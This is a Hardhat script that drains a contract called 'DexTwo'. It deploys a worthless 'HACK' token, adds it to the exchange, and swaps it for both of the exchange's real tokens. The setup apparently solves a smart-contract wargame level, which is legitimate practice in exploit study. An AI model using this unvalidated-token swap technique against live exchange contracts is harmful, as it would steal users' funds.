const hre = require("hardhat");
const { ethers } = hre;

async function main() {
  const [stealer] = await hre.ethers.getSigners();

  const dexAddr = "0x9c98413872248539d34f271cC5d1bac987D6DCf5";
  const dex = await ethers.getContractAt("DexTwo", dexAddr);
  const token1Addr = await dex.token1();
  const token2Addr = await dex.token2();

  // approve tokens spending
  await dex.approve(dex.address, 1000000);
  console.log("Approved tokens spending");

  // create a new swappable token
  const SwappableToken = await ethers.getContractFactory("SwappableToken");
  const hackToken = await SwappableToken.deploy(dex.address, "Hack Token", "HACK", 1000000);
  await hackToken.deployed();

  console.log("Hack token deployed:", hackToken.address);

  // add hack token liquidity in DEX
  await (await hackToken.transfer(dex.address, 100)).wait();

  // approve HACK transfers
  await hackToken["approve(address,uint256)"](dex.address, 1000);

  console.log("HACK liquidity added to DEX");
  console.log("Stealer HACK amount:", (await dex.balanceOf(hackToken.address, stealer.address)).toString());
  console.log("DEX HACK liquidity amount:", (await dex.balanceOf(hackToken.address, dex.address)).toString());

  // swap hack token for token 1
  await (await dex.swap(hackToken.address, token1Addr, 100, { gasLimit: 600000 })).wait();
  console.log("Swapped for token1");
  console.log("Contract token1 balance:", (await dex.balanceOf(token1Addr, dex.address)).toString());

  // swap hack token for token 2
  await (await dex.swap(hackToken.address, token2Addr, 200, { gasLimit: 600000 })).wait();
  console.log("Swapped for token2");
  console.log("Contract token2 balance:", (await dex.balanceOf(token2Addr, dex.address)).toString());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
